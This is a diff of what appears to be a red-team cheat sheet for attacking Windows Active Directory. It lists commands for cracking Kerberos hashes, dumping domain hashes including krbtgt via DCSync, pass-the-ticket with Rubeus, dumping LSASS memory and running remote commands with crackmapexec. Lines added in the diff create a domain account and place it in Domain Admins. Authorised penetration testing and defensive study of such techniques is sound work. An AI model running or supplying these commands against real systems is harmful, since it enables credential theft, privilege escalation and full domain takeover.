@@ -4,12 +4,12 @@ Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
 make_token domain\user password
 rev2self
 
-dcsync fqdn domain\user (User must have DCSync rights)
+dcsync fqdn domain\user (User must have DCSync rights in that domain)
   dcsync fqdn domain\krbtgt (golden ticket)
   dcsync fqdn (dump entire domain hashes)
 Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
 
-Seatbelt.exe system (Opsec Tool)
+Seatbelt.exe system|user (Opsec Tool)
 SharpUp.exe (Privesc Tool)
 SharpDump.exe (LSASS MiniDump Tool)
 SharpView.exe (Enumeration)
@@ -20,6 +20,13 @@ crackmapexec IP_Address -u username -p='password' (Test if you have access)
 crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
   - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
 crackmapexec IP -u username -H hash
+
+Cobalt - pth (Will perform a Kerberos downgrade and could be detected)
+
+shell net user username /domain (query domain user)
+shell net user username password /domain /add (Add User)
+shell net group "Domain Admins" /domain
+shell net group "Domain Admins" username /add /domain
 
 Exchange PrivEsc
   https://github.com/dirkjanm/privexchange
